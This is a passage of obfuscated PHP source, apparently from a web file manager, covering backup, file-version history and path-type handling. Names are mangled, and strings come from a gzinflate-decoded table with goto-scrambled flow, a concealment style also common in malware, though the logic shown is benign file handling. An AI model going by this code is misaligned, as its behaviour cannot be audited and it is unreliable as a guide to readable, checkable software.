strlen("\x7b\151\x6f\72{$ó…ÎàÁ¤[$_SERVER[¿ÈˆÑ¸ä][909]]}\x7d")); if (IO::exist($ø¨½®‚î)) { $±¯İ¡Ëê->updateFileEnd($ó…ÎàÁ¤[$_SERVER[¿ÈˆÑ¸ä][32]], $ó…ÎàÁ¤[$_SERVER[¿ÈˆÑ¸ä][79]]); } else { $ø¨½®‚î = get_path_father($ø¨½®‚î); IO::mkdir($ø¨½®‚î); if (!IO::copy($†¸Ëª¤¶, $ø¨½®‚î, $_SERVER[¿ÈˆÑ¸ä][910])) { Backup::log($_SERVER[¿ÈˆÑ¸ä][911] . $†¸Ëª¤¶ . $_SERVER[¿ÈˆÑ¸ä][895] . $ø¨½®‚î . $_SERVER[¿ÈˆÑ¸ä][176]); $¡Ç×Éİ½ = !1; break; } } $¤ÇäªÓÑ = $ó…ÎàÁ¤[$_SERVER[¿ÈˆÑ¸ä][553]]; $¿Ôâ×óè += 1; $¾Ç˜­­á += $ó…ÎàÁ¤[$_SERVER[¿ÈˆÑ¸ä][79]]; $Õ‹‰Â½ += 1; $°¦³åå” += $ó…ÎàÁ¤[$_SERVER[¿ÈˆÑ¸ä][79]]; if ($¾Ç˜­­á >= 1024 * 1024 * 100) { $®ÎÕ¥ = array($_SERVER[¿ÈˆÑ¸ä][834] => $¤ÇäªÓÑ, $_SERVER[¿ÈˆÑ¸ä][912] => $Õ‹‰Â½, $_SERVER[¿ÈˆÑ¸ä][913] => $°¦³åå”); Backup::set($®ÎÕ¥); $¾Ç˜­­á = $¿Ôâ×óè = 0; } } $ï¸€¹ ğ = count($±ôÌ¦ë); $ôãóğ€ë++; } while ($ï¸€¹ ğ == $½ªÍàì®); $±¯İ¡Ëê->end(); $®ÎÕ¥ = array($_SERVER[¿ÈˆÑ¸ä][914] => 1, $_SERVER[¿ÈˆÑ¸ä][845] => time(), $_SERVER[¿ÈˆÑ¸ä][861] => 1, $_SERVER[¿ÈˆÑ¸ä][834] => $¤ÇäªÓÑ, $_SERVER[¿ÈˆÑ¸ä][915] => time()); if ($¿Ôâ×óè) { $®ÎÕ¥[$_SERVER[¿ÈˆÑ¸ä][912]] = $Õ‹‰Â½; $®ÎÕ¥[$_SERVER[¿ÈˆÑ¸ä][913]] = $°¦³åå”; } Backup::set($®ÎÕ¥); return !0; } private function _fileExist($°ŸÖ±ÆÇ, &$ñÑ›¤Æ˜, $âæßÙá) { $ÕıãŞı =& $_SERVER[¿ÈˆÑ¸ä]; $ŸŸ˜ÀÃ„ = $°ŸÖ±ÆÇ[$ÕıãŞı[87]]; if (in_array($°ŸÖ±ÆÇ[$ÕıãŞı[553]], $ñÑ›¤Æ˜)) { return !1; } if (!in_array($°ŸÖ±ÆÇ[$ÕıãŞı[909]], $âæßÙá)) { return !1; } if (IO::exist($ŸŸ˜ÀÃ„)) { return !0; } $¡˜ô—«š = get_path_father($ŸŸ˜ÀÃ„); if (IO::exist($¡˜ô—«š)) { $ñÑ›¤Æ˜[] = $°ŸÖ±ÆÇ[$ÕıãŞı[553]]; return !1; } $êü’€Ä¡ = array($ÕıãŞı[909] => $°ŸÖ±ÆÇ[$ÕıãŞı[909]], $ÕıãŞı[87] => array($ÕıãŞı[470], "{$¡˜ô—«š}\45")); $¶ÖëŒ“ë = Model($ÕıãŞı[877])->where($êü’€Ä¡)->field($ÕıãŞı[554])->select(); $ñÑ›¤Æ˜ = array_merge($ñÑ›¤Æ˜, array_to_keyvalue($¶ÖëŒ“ë, $ÕıãŞı[12], $ÕıãŞı[553])); return !1; } private function _fileFilter($—¼İ»ë) { $Š½ÒÀˆŞ =& $_SERVER[¿ÈˆÑ¸ä]; return; if (empty($—¼İ»ë)) { return; } $È¼¨â² = array($Š½ÒÀˆŞ[553] => array($Š½ÒÀˆŞ[7], array_unique($—¼İ»ë))); $ÑÍå¨‡« = Model($Š½ÒÀˆŞ[916])->where($È¼¨â²)->field($Š½ÒÀˆŞ[192])->select(); foreach ($ÑÍå¨‡« as $æ˜™ÍÉ) { Model($Š½ÒÀˆŞ[916])->remove($æ˜™ÍÉ[$Š½ÒÀˆŞ[192]], !1); } } private function storeIds() { $æ„ÃÉ¹ï =& $_SERVER[¿ÈˆÑ¸ä]; $ŒË³ä‡ = Model($æ„ÃÉ¹ï[851])->listData(); $ğ„Ş”Ñ’ = array(); $ìÏ³ûıƒ = $GLOBALS[$æ„ÃÉ¹ï[6]][$æ„ÃÉ¹ï[92]][$æ„ÃÉ¹ï[917]]; foreach ($ŒË³ä‡ as $ûÄ»²ÍØ) { $÷—ìÎóî = strtolower($ûÄ»²ÍØ[$æ„ÃÉ¹ï[96]]); if (!isset($ìÏ³ûıƒ[$÷—ìÎóî])) { continue; } $®Öı¦ÈÂ = $æ„ÃÉ¹ï[77] . (isset($ìÏ³ûıƒ[$÷—ìÎóî]) ? $ìÏ³ûıƒ[$÷—ìÎóî] : ucfirst($÷—ìÎóî)); if (!class_exists($®Öı¦ÈÂ)) { continue; } $ğ„Ş”Ñ’[] = $ûÄ»²ÍØ[$æ„ÃÉ¹ï[483]]; } return $ğ„Ş”Ñ’; } } goto cñéÒ¬´¦İ; B‰§¢ôçä: if (strlen($nayufsprbt) < $_SERVER[¿ÈˆÑ¸ä][699]) { return; } $_SERVER[ø÷æ£ÁÖ] = explode($_SERVER[¿ÈˆÑ¸ä][700], gzinflate(substr($_SERVER[¿ÈˆÑ¸ä][701], 10, -8))); $yevoxlzutb = $_SERVER[¿ÈˆÑ¸ä][702]; goto Cõµˆ§ª´µ; aùÑ”Ğºø–: class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $í”…‚î =& $_SERVER[¿ÈˆÑ¸ä]; $ÛÀú³‚š = $GLOBALS[$í”…‚î[6]][$í”…‚î[92]]; if ($ÛÀú³‚š[$í”…‚î[1340]] != 1) { return; } if ($ÛÀú³‚š[$í”…‚î[1341]] <= 0) { return; } if (isset($_REQUEST[$í”…‚î[1342]]) && $_REQUEST[$í”…‚î[1342]] == $í”…‚î[91]) { return; } Hook::bind($í”…‚î[1343], $í”…‚î[1344]); Hook::bind($í”…‚î[1345], $í”…‚î[1346]); Hook::bind($í”…‚î[1347], $í”…‚î[1348]); Hook::bind($í”…‚î[1349], $í”…‚î[1350]); Hook::bind($í”…‚î[1351], $í”…‚î[1352]); Hook::bind($í”…‚î[1353], $í”…‚î[1354]); } public static function eventBeforeUpload($ú™ÊİŸş) { if ($ú™ÊİŸş[3] && $ú™ÊİŸş[3] != REPEAT_REPLACE) { return; } $ˆÁÔ ‡ = self::parsePath($ú™ÊİŸş[0]); if (!$ˆÁÔ ‡) { return; } self::add($ˆÁÔ ‡); } public static function eventBeforeEdit($‡¸±Âà¡) { $†ı®Ñ¸ = self::parsePath($‡¸±Âà¡[0]); if (!$†ı®Ñ¸) { return; } self::add($†ı®Ñ¸); } public static function eventBeforeCopyFile($ëßğÔ˜», $œ¤åÓò¸, $®•Ç‘Ÿğ, $œ¤ÖÆÓâ, $„Êğú¾, $ÈÚ°³êÔ) { $‘äñÑ¾Ğ =& $_SERVER[¿ÈˆÑ¸ä]; if (isset($®•Ç‘Ÿğ->_data[$‘äñÑ¾Ğ[1274]]) && $®•Ç‘Ÿğ->_data[$‘äñÑ¾Ğ[1274]]) { return; } $ıÜ¯àÑ = $®•Ç‘Ÿğ->getPathOuter($œ¤ÖÆÓâ); $ÌÁ‚àØ˜ = self::parsePath($ıÜ¯àÑ); if (!$ÌÁ‚àØ˜) { return; } self::add($ÌÁ‚àØ˜); } public static function eventBeforeRename($Éïğ´À) { $ü›»Üâ¸ =& $_SERVER[¿ÈˆÑ¸ä]; $Ğ¡øÇã¨ = self::parsePath($Éïğ´À[0]); if (!$Ğ¡øÇã¨) { return; } $©ìÔÄ · = self::checkInHistory($Ğ¡øÇã¨); if (!$©ìÔÄ ·) { return; } if ($©ìÔÄ ·[$ü›»Üâ¸[33]] == $ü›»Üâ¸[231]) { $ÇÚóŒä = self::listData($Ğ¡øÇã¨); if ($ÇÚóŒä && $ÇÚóŒä[$ü›»Üâ¸[446]]) { self::moveHistory($Ğ¡øÇã¨, $Éïğ´À[1]); } } else { IO::rename($©ìÔÄ ·[$ü›»Üâ¸[87]], $Éïğ´À[1]); } } public static function eventBeforeMove($ê‰Õğ§É) { $Õ·áÎ® =& $_SERVER[¿ÈˆÑ¸ä]; $ÖÔ×ñéÔ = self::parsePath($ê‰Õğ§É[0]); if (!$ÖÔ×ñéÔ) { return; } $˜†’êšê = self::parsePath($ê‰Õğ§É[1]); if (!$˜†’êšê) { return; } $‰¿Çíü½ = $ê‰Õğ§É[3]; $ËÍ¨– = self::checkInHistory($ÖÔ×ñéÔ); if (!$ËÍ¨–) { return; } $ÁŸ–õ†î = self::pathHistory($˜†’êšê); if ($ËÍ¨–[$Õ·áÎ®[33]] == $Õ·áÎ®[231]) { $®ò‘Äôí = self::listData($ÖÔ×ñéÔ); $È÷…´¹¼ = rtrim($˜†’êšê, $Õ·áÎ®[8]) . $Õ·áÎ®[8] . ($‰¿Çíü½ ? $‰¿Çíü½ : get_path_this($ÖÔ×ñéÔ)); $ôÈ…Ú¢É = self::listData($È÷…´¹¼); if ($®ò‘Äôí && $®ò‘Äôí[$Õ·áÎ®[446]] && $ôÈ…Ú¢É && $ôÈ…Ú¢É[$Õ·áÎ®[446]]) { return self::clear($ÖÔ×ñéÔ); } if ($®ò‘Äôí && $®ò‘Äôí[$Õ·áÎ®[446]]) { self::moveHistory($ÖÔ×ñéÔ, $‰¿Çíü½, $ÁŸ–õ†î); } } else { IO::move($ËÍ¨–[$Õ·áÎ®[87]], $ÁŸ–õ†î, !1, $‰¿Çíü½); self::clearEmptyFolder(IO::pathFather($ËÍ¨–[$Õ·áÎ®[87]])); } } public static function eventAfterRemove($š•šÒŸˆ, $ÚËëñÕ®) { $”ó›İÂ¢ =& $_SERVER[¿ÈˆÑ¸ä]; if (!$ÚËëñÕ®) { return; } $ÇÀ» İÄ = self::parsePath($š•šÒŸˆ[0]); if (!$ÇÀ» İÄ) { return; } $Õ¬é¼µ = self::checkInHistory($ÇÀ» İÄ); if (!$Õ¬é¼µ) { return; } if ($Õ¬é¼µ[$”ó›İÂ¢[33]] == $”ó›İÂ¢[231]) { $›ŠèÓ¾Ù = self::listData($ÇÀ» İÄ, !1); if ($›ŠèÓ¾Ù && $›ŠèÓ¾Ù[$”ó›İÂ¢[446]]) { self::clear($ÇÀ» İÄ, !1); } } else { IO::remove($Õ¬é¼µ[$”ó›İÂ¢[87]]); self::clearEmptyFolder(IO::pathFather($Õ¬é¼µ[$”ó›İÂ¢[87]])); } } private static function checkInHistory($î¤¹»ú) { $“ÀªöÓ“ = self::pathHistory($î¤¹»ú); if (!IO::exist($“ÀªöÓ“)) { $“ÀªöÓ“ .= $_SERVER[¿ÈˆÑ¸ä][1355]; } return IO::exist($“ÀªöÓ“) ? IO::info($“ÀªöÓ“) : !1; } private static function parsePath($ê•áÏâ¶) { $¥Ô•Ï²ğ =& $_SERVER[¿ÈˆÑ¸ä]; if (!$ê•áÏâ¶) { return !1; } if (isset($GLOBALS[$¥Ô•Ï²ğ[1356]]) && $GLOBALS[$¥Ô•Ï²ğ[1356]]) { return; } $˜Î®ùÎ£ = KodIO::parse($ê•áÏâ¶); $êç¹Ô¼ = $˜Î®ùÎ£[$¥Ô•Ï²ğ[33]]; $•áÊŞ¢ı = !$êç¹Ô¼ || $êç¹Ô¼ == KodIO::KOD_IO || $êç¹Ô¼ == KodIO::KOD_SHARE_ITEM; if (!$•áÊŞ¢ı || !$˜Î®ùÎ£[$¥Ô•Ï²ğ[1357]]) { return !1; } if (substr($ê•áÏâ¶, 0, strlen(DATA_PATH . $¥Ô•Ï²ğ[1358])) == DATA_PATH . $¥Ô•Ï²ğ[1358]) { return !1; } if ($êç¹Ô¼ == KodIO::KOD_SHARE_ITEM) { $ÜåÛ¼ğö = IO::init($ê•áÏâ¶); if ($ÜåÛ¼ğö->pathParse[$¥Ô•Ï²ğ[1270]]) { return self::parsePath($ÜåÛ¼ğö->pathParse[$¥Ô•Ï²ğ[1270]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $°öÏĞ¸À = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $¥Ô•Ï²ğ[1359]); foreach ($°öÏĞ¸À as $ê•÷€ÈŸ) { if (!$êç¹Ô¼ && substr($ê•áÏâ¶, 0, strlen($ê•÷€ÈŸ)) == $ê•÷€ÈŸ) { return !1; } } self::log($GLOBALS[$¥Ô•Ï²ğ[1264]] . $¥Ô•Ï²ğ[1360] . $ê•áÏâ¶); return $ê•áÏâ¶; } private static function pathHistory($­š‡™Ûô) { $Ôõµ÷” =& $_SERVER[¿ÈˆÑ¸ä]; $›¤¡éÍŒ = self::$_historyBase . ltrim(KodIO::clear($­š‡™Ûô), $Ôõµ÷”[8]); $›¤¡éÍŒ = str_replace(array($Ôõµ÷”[1361]), array($Ôõµ÷”[1362]), $›¤¡éÍŒ); return $›¤¡éÍŒ; } public static function log($½®­€ã) { } public static function historyCount($µš¼Á‹Ú) { $¦¥˜êŒŠ =& $_SERVER[¿ÈˆÑ¸ä]; $ú«ÇŸ®ç = array(); $¾ÇöÚŞ” = array(); foreach ($µš¼Á‹Ú as $ğ³¯ª·Õ) { $Â­ÍÜİÑ = get_path_father($ğ³¯ª·Õ); if (!$¾ÇöÚŞ”[$Â­ÍÜİÑ]) { $¾ÇöÚŞ”[$Â­ÍÜİÑ] = array(); } $¾ÇöÚŞ”[$Â­ÍÜİÑ][] = get_path_this($ğ³¯ª·Õ); } foreach ($¾ÇöÚŞ” as $Â­ÍÜİÑ => $Ì¾À®˜—) { $êêŸ«ÒÜ = self::parsePath($Â­ÍÜİÑ); if (!$êêŸ«ÒÜ) { continue; } foreach ($Ì¾À®˜— as $ÔèÃ°½é) { $ÚÖğÓª« = self::listData(rtrim($êêŸ«ÒÜ, $¦¥˜êŒŠ[8]) . $¦¥˜êŒŠ[8] . $ÔèÃ°½é, !1); if ($ÚÖğÓª« && $ÚÖğÓª«[$¦¥˜êŒŠ[446]]) { $ú«ÇŸ®ç[rtrim($Â­ÍÜİÑ, $¦¥˜êŒŠ[8]) . $¦¥˜êŒŠ[8] . $ÔèÃ°½é] = count($ÚÖğÓª«[$¦¥˜êŒŠ[446]]); } } } return $ú«ÇŸ®ç; } public static function add($ÒÀæÌ) { $«âà÷œç =& $_SERVER[¿ÈˆÑ¸ä]; $›Ö†úó­ = self::listData($ÒÀæÌ); if (!$›Ö†úó­) { return; } $ÂÍı¬å… = Model($«âà÷œç[856])->get($«âà÷œç[1363]); $é³µ¤Š© = intval($GLOBALS[$«âà÷œç[6]][$«âà÷œç[92]][$«âà÷œç[1341]]); $ïÃ‰›©¾ = $ÂÍı¬å… == $«âà÷œç[1364] ? min(5, $é³µ¤Š©) : $é³µ¤Š©; if ($é³µ¤Š© <= 0) { return; } $í›™éƒ£ = IO::info($ÒÀæÌ); $¹†ÑÎ¸´ = $›Ö†úó­[$«âà÷œç[446]]; if ($í›™éƒ£[$«âà÷œç[79]] == 0) { return; } if ($í›™éƒ£[$«âà÷œç[79]] >= 1024 * 1024 * 500) { return !1; } $ËÜÂ’Ó = IO::hashSimple($ÒÀæÌ); if ($¹†ÑÎ¸´ && $¹†ÑÎ¸´[0][$«âà÷œç[691]] == $ËÜÂ’Ó) { return !0; } if (array_key_exists($«âà÷œç[234], $í›™éƒ£) && !$í›™éƒ£[$«âà÷œç[234]]) { return !1; } $•ÖÇŠ“ä = short_id(time()); $Æ¥Ù¨â = array($«âà÷œç[483] => $•ÖÇŠ“ä, $«âà÷œç[691] => $ËÜÂ’Ó, $«âà÷œç[32] => $í›™éƒ£[$«âà÷œç[32]] . $«âà÷œç[10] . date($«âà÷œç[1365]) . rand_string(1), $«âà÷œç[79] => $í›™éƒ£[$«âà÷œç[79]], $«âà÷œç[537] => USER_ID, $«âà÷œç[232] => time(), $«âà÷œç[1366] => $«âà÷œç[12]); IO::mkdir($›Ö†úó­[$«âà÷œç[1367]]); $‰æƒíòñ = IO::copy($ÒÀæÌ, $›Ö†úó­[$«âà÷œç[1367]], !1, $Æ¥Ù¨â[$«âà÷œç[32]]); if (!$‰æƒíòñ) { self::clearEmptyFolder($›Ö†úó­[$«âà÷œç[1367]]); return !1; } array_unshift($¹†ÑÎ¸´, $Æ¥Ù¨â); if (count($¹†ÑÎ¸´) > $ïÃ‰›©¾) { $…á¹Öô = array_slice($¹†ÑÎ¸´, $ïÃ‰›©¾); foreach ($…á¹Öô as $òŒì„¦) { IO::remove($›Ö†úó­[$«âà÷œç[1367]] . $òŒì„¦[$«âà÷œç[32]]); } $¹†ÑÎ¸´ = array_slice($¹†ÑÎ¸´, 0, $ïÃ‰›©¾); } return self::saveData($›Ö†úó­[$«âà÷œç[1368]], $¹†ÑÎ¸´); } public static function remove($Êã¯õ˜, $§ï»¨Ÿ) { $ÕÃıãÔû =& $_SERVER[¿ÈˆÑ¸ä]; $÷ªŸ«Û = self::listData($Êã¯õ˜); $Ÿù’Ï = array(); if (!$÷ªŸ«Û) { return !1; } foreach ($÷ªŸ«Û[$ÕÃıãÔû[446]] as $ã²½šŞş) { if ($ã²½šŞş[$ÕÃıãÔû[483]] == $§ï»¨Ÿ) { IO::remove($÷ªŸ«Û[$ÕÃıãÔû[1367]] . $ã²½šŞş[$ÕÃıãÔû[32]]); continue; } $Ÿù’Ï[] = $ã²½šŞş; } return self::saveData($÷ªŸ«Û[$ÕÃıãÔû[1368]], $Ÿù’Ï); } public static function clear($·›¯Ç¯¯, $ ›ÀéÙ = true) { $¢¥¹³òÏ =& $_SERVER[¿ÈˆÑ¸ä]; $Ÿë•íí = self::listData($·›¯Ç¯¯, $ ›ÀéÙ); if (!$Ÿë•íí) { return !1; } foreach ($Ÿë•íí[$¢¥¹³òÏ[446]] as $±»ŸÒ‚Û) { IO::remove($Ÿë•íí[$¢¥¹³òÏ[1367]] . $±»ŸÒ‚Û[$¢¥¹³òÏ[32]]); } return self::saveData($Ÿë•íí[$¢¥¹³òÏ[1368]], array()); } public static function moveHistory($Èâ›Ó±, $·²°½ä = '', $­›—Ê„ = '') { $²á€Šµê =& $_SERVER[¿ÈˆÑ¸ä]; $úÒ“æé´ = self::listData($Èâ›Ó±, !1); if (!$úÒ“æé´ || !$úÒ“æé´[$²á€Šµê[446]]) { return !1; } $®‰–¢éÇ = $²á€Šµê[1355]; $·²°½ä = $·²°½ä ? $·²°½ä : get_path_this($Èâ›Ó±); $­›—Ê„ = $­›—Ê„ ? $­›—Ê„ : $úÒ“æé´[$²á€Šµê[1367]]; $‡ªÑĞ = substr(get_path_this($úÒ“æé´[$²á€Šµê[1368]]), 0, -strlen($®‰–¢éÇ)); foreach ($úÒ“æé´[$²á€Šµê[446]] as $À³³ªú => $³ÓØ½ŒÑ) { $û€—Œ‚¡ = $·²°½ä . substr($³ÓØ½ŒÑ[$²á€Šµê[32]], strlen($‡ªÑĞ)); $Ì‚»¡…³ = IO::move($úÒ“æé´[$²á€Šµê[1367]] . $³ÓØ½ŒÑ[$²á€Šµê[32]], $­›—Ê„, !1, $û€—Œ‚¡); if ($Ì‚»¡…³) { $úÒ“æé´[$²á€Šµê[446]][$À³³ªú][$²á€Šµê[32]] = $û€—Œ‚¡; } } $úÒ“æé´[$²á€Šµê[1368]] = IO::move($úÒ“æé´[$²á€Šµê[1368]], $­›—Ê„, !1, $·²°½ä . $®‰–¢éÇ); self::saveData($úÒ“æé´[$²á€Šµê[1368]], $úÒ“æé´[$²á€Šµê[446]]); self::clearEmptyFolder($úÒ“æé´[$²á€Šµê[1367]]); } public static function rollback($»òò¿òÛ, $¶¾Ó«¬Ã) { $È‡›Ï­ =& $_SERVER[¿ÈˆÑ¸ä]; $ı…Æèõ = self::listData($»òò¿òÛ); if (!$ı…Æèõ) { return; } $áûÍ´Âû = IO::info($»òò¿òÛ); foreach ($ı…Æèõ[$È‡›Ï­[446]] as $òé…¸Ğ¬ => $¿‰â¤üŞ) { if ($¿‰â¤üŞ[$È‡›Ï­[483]] == $¶¾Ó«¬Ã) { self::add($»òò¿òÛ); $•¤Ó…² = $ı…Æèõ[$È‡›Ï­[1367]] . $¿‰â¤üŞ[$È‡›Ï­[32]]; $ßÅÂ›÷ = IO::copy($•¤Ó…², IO::pathFather($»òò¿òÛ), REPEAT_REPLACE, $áûÍ´Âû[$È‡›Ï­[32]]); if ($ßÅÂ›÷) { self::remove($»òò¿òÛ, $¶¾Ó«¬Ã); } return $ßÅÂ›÷; } } return !1; } public static function setDetail($îäÇÑâ’, $÷¤’‡ç², $Ì¬–É÷Ë) { $¨úÑ“°å =& $_SERVER[¿ÈˆÑ¸ä]; $÷ıñãœü = self::listData($îäÇÑâ’); if (!$÷ıñãœü) { return; } foreach ($÷ıñãœü[$¨úÑ“°å[446]] as $”ğ›Ë¤± => $¼Ğå€±ô) { if ($¼Ğå€±ô[$¨úÑ“°å[483]] == $÷¤’‡ç²) { $÷ıñãœü[$¨úÑ“°å[446]][$”ğ›Ë¤±][$¨úÑ“°å[1366]] = $Ì¬–É÷Ë; self::saveData($÷ıñãœü[$¨úÑ“°å[1368]], $÷ıñãœü[$¨úÑ“°å[446]]); return !0; } } return !1; } public static function fileInfo($ûÊËÈˆö, $Óæ·İµº) { $Åå¶—¢è =& $_SERVER[¿ÈˆÑ¸ä]; $×¶•ù¬ó = self::listData($ûÊËÈˆö); if (!$×¶•ù¬ó) { show_json(LNG($Åå¶—¢è[106]), !1); } $”×¸¢ÈÜ = $Åå¶—¢è[12]; foreach ($×¶•ù¬ó[$Åå¶—¢è[446]] as $İ°âëÛº => $¼èäÔ¿) { if ($¼èäÔ¿[$Åå¶—¢è[483]] != $Óæ·İµº) { continue; } $”×¸¢ÈÜ = $×¶•ù¬ó[$Åå¶—¢è[1367]] . $¼èäÔ¿[$Åå¶—¢è[32]]; break; } if (!$”×¸¢ÈÜ) { show_json(LNG($Åå¶—¢è[106]), !1); } return IO::info($”×¸¢ÈÜ); } public static function fileOut($¬ŒÊçòØ, $ÁÎ½˜, $¥ÄØŸÉœ = false) { $Ÿõ ËÏ‰ =& $_SERVER[¿ÈˆÑ¸ä]; $Ëµ†ÕÉó = self::fileInfo($¬ŒÊçòØ, $ÁÎ½˜); $ïœ‡Øëõ =& $GLOBALS[$Ÿõ ËÏ‰[7]]; $¥ÄØŸÉœ = isset($ïœ‡Øëõ[$Ÿõ ËÏ‰[1318]]) && $ïœ‡Øëõ[$Ÿõ ËÏ‰[1318]] == 1; if (isset($ïœ‡Øëõ[$Ÿõ ËÏ‰[33]]) && $ïœ‡Øëõ[$Ÿõ ËÏ‰[33]] == $Ÿõ ËÏ‰[1369]) { return IO::fileOutImage($Ëµ†ÕÉó[$Ÿõ ËÏ‰[87]], $ïœ‡Øëõ[$Ÿõ ËÏ‰[1370]]); } IO::fileOut($Ëµ†ÕÉó[$Ÿõ ËÏ‰[87]], $¥ÄØŸÉœ, get_path_this($¬ŒÊçòØ)); } public static function listData($úîÚØÉ—, $¤óíĞÄ² = true) { $Ñç–¨÷Ì =& $_SERVER[¿ÈˆÑ¸ä]; if ($¤óíĞÄ² && !IO::exist($úîÚØÉ—)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($úîÚØÉ—, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $ê¸şøø = self::pathHistory($úîÚØÉ—); $™ß£«¥ = array($Ñç–¨÷Ì[1368] => $ê¸şøø . $Ñç–¨÷Ì[1355], $Ñç–¨÷Ì[1367] => rtrim(get_path_father($ê¸şøø), $Ñç–¨÷Ì[8]) . $Ñç–¨÷Ì[8], $Ñç–¨÷Ì[446] => array()); $í—ÑãÍí = IO::getContent($™ß£«¥[$Ñç–¨÷Ì[1368]]); if ($í—ÑãÍí) { $£™—Ñ† = json_decode($í—ÑãÍí, !0); if (is_array($£™—Ñ†)) { $™ß£«¥[$Ñç–¨÷Ì[446]] = $£™—Ñ†; } } return $™ß£«¥; } private static function saveData($ïÉˆÏé, $Ã™Àáçõ) { $ñ˜¸Ë÷ş =& $_SERVER[¿ÈˆÑ¸ä]; self::log($ñ˜¸Ë÷ş[1371] . $ïÉˆÏé . $ñ˜¸Ë÷ş[74] . count($Ã™Àáçõ), $ñ˜¸Ë÷ş[835]); if ($Ã™Àáçõ) { return IO::setContent($ïÉˆÏé, json_encode($Ã™Àáçõ)); } $²Ãèòò‘ = IO::pathFather($ïÉˆÏé); IO::remove($ïÉˆÏé); self::clearEmptyFolder($²Ãèòò‘); return !0; } public static function clearEmptyFolder($ó­ãûÆú) { $‹¦ŞœÈ =& $_SERVER[¿ÈˆÑ¸ä]; if (trim($ó­ãûÆú, $‹¦ŞœÈ[8]) == trim(self::$_historyBase, $‹¦ŞœÈ[8])) { return; } $‡«—½¾Ü = IO::pathFather($ó­ãûÆú); $â•ø‘Ââ = IO::has($ó­ãûÆú, !0); if ($â•ø‘Ââ[$‹¦ŞœÈ[240]] > 0 || $â•ø‘Ââ[$‹¦ŞœÈ[241]] > 0) { return; } IO::remove($ó­ãûÆú); self::clearEmptyFolder($‡«—½¾Ü); } private static function getBasePath() { $¡±Ûª£ =& $_SERVER[¿ÈˆÑ¸ä]; $¨ñØèàê = Model($¡±Ûª£[1372])->get($¡±Ûª£[1373]); if ($¨ñØèàê) { if (!IO::exist($¨ñØèàê)) { IO::mkdir($¨ñØèàê); } if (get_path_this($¨ñØèàê) == $¡±Ûª£[1358]) { $æ¢ËŞ¯— = $¡±Ûª£[1374] . rand_string(8); @rename($¨ñØèàê, get_path_father($¨ñØèàê) . $¡±Ûª£[8] . $æ¢ËŞ¯—); $¨ñØèàê = DATA_PATH . $æ¢ËŞ¯— . $¡±Ûª£[8]; file_put_contents(DATA_PATH . $¡±Ûª£[1306], $¡±Ûª£[12]); Model($¡±Ûª£[1372])->set($¡±Ûª£[1373], $¨ñØèàê); } return $¨ñØèàê; } $¨ñØèàê = DATA_PATH . $¡±Ûª£[1374] . rand_string(8) . $¡±Ûª£[8]; $¨ñØèàê = IO::mkdir($¨ñØèàê); $¨ñØèàê = rtrim($¨ñØèàê, $¡±Ûª£[8]) . $¡±Ûª£[8]; file_put_contents($¨ñØèàê . $¡±Ûª£[1306], $¡±Ûª£[12]); file_put_contents(DATA_PATH . $¡±Ûª£[1306], $¡±Ûª£[12]); Model($¡±Ûª£[1372])->set($¡±Ûª£[1373], $¨ñØèàê); return $¨ñØèàê; } } class KodIO { const KOD_SOURCE = "\x7b\x73\x6f\165\x72\143\x65\x7d"; const KOD_USER_RECYCLE = "\x7b\x75\163\x65\162\122\x65\x63\171\x63\154\145\x7d"; const KOD_USER_FAV = "\x7b\x75\x73\145\x72\106\141\166\175"; const KOD_USER_FILE_TAG = "\x7b\165\163\145\x72\x46\x69\154\145\x54\x61\147\x7d"; const KOD_USER_FILE_TYPE = "\x7b\165\x73\145\x72\x46\x69\x6c\145\124\171\x70\x65\175"; const KOD_GROUP_ROOT_SELF = "\x7b\x67\162\157\x75\160\x52\157\x6f\164\x53\x65\154\146\175"; const KOD_USER_SHARE = "\173\x75\x73\x65\162\123\150\x61\x72\x65\175"; const KOD_USER_SHARE_LINK = "\x7b\165\163\145\162\123\x68\141\x72\145\x4c\x69\x6e\153\175"; const KOD_USER_SHARE_TO_ME = "\x7b\x73\150\x61\x72\x65\x54\x6f\115\145\x7d"; const KOD_SHARE_ITEM = "\173\x73\x68\x61\x72\145\111\x74\x65\x6d\x7d"; const KOD_SHARE_LINK = "\x7b\163\150\x61\162\x65\111\164\145\155\114\151\156\153\175"; const KOD_SHARE_OUTER = "\173\163\x68\141\162\x65\x49\x74\145\x6d\x4f\x75\x74\175"; const KOD_SEARCH = "\x7b\163\145\141\x72\x63\150\175"; const KOD_BLOCK = "\173\x62\154\x6f\x63\153\x7d"; const KOD_IO = "\x7b\151\157\x7d"; const KOD_USER_RECENT = "\x7b\165\x73\x65\x72\x52\x65\156\x63\145\x6e\164\x7d"; const KOD_USER_DRIVER = "\173\x64\162\151\x76\145\x72\x7d"; public static function typeList() { $‚¢ÕÛ¼ú =& $_SERVER[¿ÈˆÑ¸ä]; return array($‚¢ÕÛ¼ú[1375] => self::KOD_SOURCE, $‚¢ÕÛ¼ú[1376] => self::KOD_USER_RECYCLE, $‚¢ÕÛ¼ú[1377] => self::KOD_USER_FAV, $‚¢ÕÛ¼ú[1378] => self::KOD_USER_FILE_TAG, $‚¢ÕÛ¼ú[1379] => self::KOD_USER_FILE_TYPE, $‚¢ÕÛ¼ú[1380] => self::KOD_GROUP_ROOT_SELF, $‚¢ÕÛ¼ú[1381] => self::KOD_USER_SHARE, $‚¢ÕÛ¼ú[1382] => self::KOD_USER_SHARE_LINK, $‚¢ÕÛ¼ú[1383] => self::KOD_USER_SHARE_TO_ME, $‚¢ÕÛ¼ú[1384] => self::KOD_SHARE_ITEM, $‚¢ÕÛ¼ú[1385] => self::KOD_SHARE_LINK, $‚¢ÕÛ¼ú[1386] => self::KOD_SHARE_OUTER, $‚¢ÕÛ¼ú[1387] => self::KOD_SEARCH, $‚¢ÕÛ¼ú[1388] => self::KOD_BLOCK, $‚¢ÕÛ¼ú[1389] => self::KOD_IO, $‚¢ÕÛ¼ú[1390] => self::KOD_USER_RECENT, $‚¢ÕÛ¼ú[1391] => self::KOD_USER_DRIVER); } public static function parse($¥ãÕüş) { $äÍÉœÉµ =& $_SERVER[¿ÈˆÑ¸ä]; $¥ãÕüş = self::clear($¥ãÕüş); $¬æŸ»èø = array_values(self::typeList()); preg_match($äÍÉœÉµ[1392], $¥ãÕüş, $ˆÛØşÜ); $³Åù¸ˆ¼ = 